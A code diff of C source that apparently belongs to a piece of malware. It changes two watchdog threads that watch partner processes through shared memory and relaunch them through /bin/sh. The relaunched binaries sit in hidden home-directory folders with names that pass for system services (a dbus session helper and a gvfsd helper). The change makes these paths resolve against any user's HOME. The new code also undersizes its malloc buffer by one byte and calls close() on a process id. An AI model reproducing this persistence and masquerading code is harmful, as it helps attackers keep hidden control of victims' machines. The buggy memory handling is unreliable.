@@ -422,13 +422,23 @@ void *watchdog_process_shmget() {
                     getpid(),
                     upper_bytes);
 
-            // TODO - stack string file path  and dynamically resolve it.
-            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
+
+            char *user = getenv("HOME");
+            char *sessiondbus_helper_path = "/.dbus/sessions/session-dbus";
+            int sessiondbus_path_size = strlen(user) + strlen(sessiondbus_helper_path);
+            char *user_sessiondbus_helper_path = (char *)malloc(sessiondbus_path_size);
+            memset(user_sessiondbus_helper_path, 0, sessiondbus_path_size);
+
+            memcpy(user_sessiondbus_helper_path, user, strlen(user));
+            strncat(user_sessiondbus_helper_path, sessiondbus_helper_path, strlen(sessiondbus_helper_path));
+            //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {"/bin/sh", "-c", user_sessiondbus_helper_path, "&", NULL}; // NULL terminated array of char* strings
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
             }
             close(f_pid);
+            free(user_sessiondbus_helper_path);
         }
 
         sleep(5);
@@ -498,14 +508,24 @@ void *watchdog_process_shmread() {
             fprintf(stderr, "[shmread] (%d) process id %d is not alive! spawning\n", getpid(), *tmpPid);
             #endif
 
-            // TODO - stack string file path  and dynamically resolve it.
-            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
+            char *user = getenv("HOME");
+            char *gvfsd_helper_path = "/.gvfsd/.profile/gvfsd-helper";
+            int gvfsd_path_size = strlen(user) + strlen(gvfsd_helper_path);
+            char *user_gvfsd_helper_path = (char *)malloc(gvfsd_path_size);
+            memset(user_gvfsd_helper_path, 0, gvfsd_path_size);
+
+            memcpy(user_gvfsd_helper_path, user, strlen(user));
+            strncat(user_gvfsd_helper_path, gvfsd_helper_path, strlen(gvfsd_helper_path));
+
+            //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {"/bin/sh", "-c", user_gvfsd_helper_path, "&", NULL}; // NULL terminated array of char* strings
 
             int f_pid = fork();
             if (f_pid == 0) {
                 execvp("/bin/sh", argument_list);
             }
             close(f_pid);
+            free(user_gvfsd_helper_path);
         }
 
         sleep(3);
